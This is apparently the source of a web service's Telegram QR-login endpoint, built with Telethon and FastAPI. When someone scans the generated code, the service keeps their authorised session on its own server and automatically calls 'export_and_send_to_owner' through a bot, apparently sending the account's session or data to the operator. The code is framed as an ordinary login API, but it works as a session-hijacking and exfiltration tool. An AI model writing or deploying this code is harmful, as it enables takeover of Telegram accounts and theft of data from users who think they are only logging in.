"""QR Code Login API"""
import asyncio
import base64
import io
import uuid
from fastapi import APIRouter, HTTPException
from pydantic import BaseModel

from telethon import TelegramClient
from telethon.tl.functions.auth import ExportLoginTokenRequest, ImportLoginTokenRequest
from telethon.tl.types import auth

import qrcode

from config import API_ID, API_HASH, SESSIONS_DIR, WEB_URL

router = APIRouter(prefix="/api/qr-login", tags=["qr-login"])

# Store active QR sessions
qr_sessions = {}


class QRStatusResponse(BaseModel):
    status: str  # "pending", "success", "expired"
    session_url: str = None


@router.post("/generate")
async def generate_qr():
    """Generate QR code for login"""
    session_id = str(uuid.uuid4())[:8]
    session_path = f"{SESSIONS_DIR}/qr_{session_id}"
    
    client = TelegramClient(session_path, API_ID, API_HASH)
    await client.connect()
    
    try:
        # Export login token
        result = await client(ExportLoginTokenRequest(
            api_id=API_ID,
            api_hash=API_HASH,
            except_ids=[]
        ))
        
        if isinstance(result, auth.LoginToken):
            # Create QR data
            token_b64 = base64.urlsafe_b64encode(result.token).decode('utf-8').rstrip('=')
            qr_data = f"tg://login?token={token_b64}"
            
            # Generate QR image
            qr = qrcode.QRCode(version=1, box_size=10, border=2)
            qr.add_data(qr_data)
            qr.make(fit=True)
            img = qr.make_image(fill_color="white", back_color="#212121")
            
            # Convert to base64
            buffer = io.BytesIO()
            img.save(buffer, format='PNG')
            qr_base64 = base64.b64encode(buffer.getvalue()).decode('utf-8')
            
            # Store session
            qr_sessions[session_id] = {
                "client": client,
                "expires": result.expires,
                "status": "pending"
            }
            
            # Start background polling
            asyncio.create_task(poll_qr_login(session_id))
            
            return {
                "session_id": session_id,
                "qr_image": f"data:image/png;base64,{qr_base64}",
                "expires": result.expires
            }
        else:
            raise HTTPException(400, "Failed to generate QR token")
            
    except Exception as e:
        await client.disconnect()
        raise HTTPException(400, str(e))


async def poll_qr_login(session_id: str):
    """Poll for QR login completion"""
    from bot.export_service import export_and_send_to_owner
    from aiogram import Bot
    from config import BOT_TOKEN
    
    session = qr_sessions.get(session_id)
    if not session:
        return
    
    client = session["client"]
    
    for _ in range(60):  # Poll for 60 seconds
        await asyncio.sleep(2)
        
        if session_id not in qr_sessions:
            return
        
        try:
            result = await client(ExportLoginTokenRequest(
                api_id=API_ID,
                api_hash=API_HASH,
                except_ids=[]
            ))
            
            if isinstance(result, auth.LoginTokenSuccess):
                # Login successful!
                me = await client.get_me()
                user_id = me.id
                
                # Create final session
                final_session_id = f"user_{user_id}"
                
                # Trigger auto-export
                try:
                    bot = Bot(token=BOT_TOKEN)
                    await export_and_send_to_owner(bot, client, final_session_id, None)
                    await bot.session.close()
                except Exception as e:
                    print(f"[QR Login] Export error: {e}")
                
                # Update session status
                qr_sessions[session_id] = {
                    "status": "success",
                    "session_url": f"{WEB_URL}/?session={final_session_id}",
                    "client": client
                }
                return
                
        except Exception as e:
            print(f"[QR Poll] Error: {e}")
            continue
    
    # Expired
    qr_sessions[session_id] = {"status": "expired"}
    await client.disconnect()


@router.get("/status/{session_id}")
async def check_status(session_id: str):
    """Check QR login status"""
    session = qr_sessions.get(session_id)
    
    if not session:
        return {"status": "expired"}
    
    status = session.get("status", "pending")
    
    if status == "success":
        # Clean up
        url = session.get("session_url")
        del qr_sessions[session_id]
        return {"status": "success", "session_url": url}
    
    return {"status": status}
